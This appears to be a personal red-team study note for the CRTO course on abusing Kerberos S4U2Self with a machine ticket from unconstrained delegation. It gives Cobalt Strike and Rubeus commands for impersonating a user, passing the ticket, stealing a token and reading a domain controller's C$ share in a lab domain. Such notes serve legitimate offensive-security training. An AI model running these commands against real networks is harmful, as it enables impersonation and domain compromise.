
There are two S4U (Service for User) extensions.  S4U2Self (Service for User to Self) and S4U2Proxy (Service for User to Proxy).  

`S4U2Self` allows a service to obtain a TGS to itself on behalf of a user.
`S4U2Proxy` allows the service to obtain a TGS on behalf of a user to a second service.

#### 🖊️ Unconstrained delegation machine ticket

If you obtained a TGT via [[Unconstrained Delegation]] but for a machine account rather than a user account, you will want to abuse S4U2Self obtaining a TGS as a user (local admin) in the objective machine. All you need is the username since you already have a ticket.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap` 

Here we are asking for a TGS in the name of a local admin in the objective machine, the user: dc-2$ , and using the ticket we obtained in the [[Unconstrained Delegation]]

2) Once you get the new ticket, you can do some [[Pass the Ticket]]

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=`
```
beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```



### ⚠ Opsec




### Properties
---
📆 created   {{19-02-2024}} 09:47
🏷️ tags: #redteam #crto 

---

